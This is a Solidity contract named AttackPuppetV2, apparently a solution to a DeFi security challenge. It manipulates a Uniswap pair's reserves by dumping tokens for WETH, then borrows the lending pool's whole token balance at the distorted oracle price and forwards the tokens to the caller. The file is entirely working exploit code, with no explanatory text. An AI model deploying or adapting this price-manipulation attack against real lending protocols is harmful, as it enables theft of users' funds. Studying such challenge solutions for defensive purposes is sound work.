// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IUniswapPair {
    function token0() external returns (address);

    function swap(
        uint amount0Out,
        uint amount1Out,
        address to,
        bytes calldata data
    ) external;

    function getReserves()
        external
        view
        returns (
            uint112 _reserve0,
            uint112 _reserve1,
            uint32 _blockTimestampLast
        );
}

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);

    function balanceOf(address account) external returns (uint256);

    function approve(address to, uint256 amount) external;
}

contract AttackPuppetV2 {
    IUniswapPair private uniswapPair;
    IERC20 private token;
    address private pool;
    IERC20 private weth;

    constructor(
        address _pool,
        address _uniswap,
        address _token,
        address _weth
    ) public {
        pool = _pool;
        uniswapPair = IUniswapPair(_uniswap);
        token = IERC20(_token);
        weth = IERC20(_weth);
    }

    function attack(uint256 tokenAmount) external {
        token.transfer(address(uniswapPair), tokenAmount);

        if (address(token) == uniswapPair.token0()) {
            uniswapPair.swap(0, 9 ether + 9 * 10 ** 17, address(this), "");
        } else {
            uniswapPair.swap(9 ether + 9 * 10 ** 17, 0, address(this), "");
        }

        weth.approve(pool, weth.balanceOf(address(this)));

        (bool s, ) = pool.call(
            abi.encodeWithSignature("borrow(uint256)", 1000000 ether)
        );

        token.transfer(msg.sender, token.balanceOf(address(this)));
    }
}
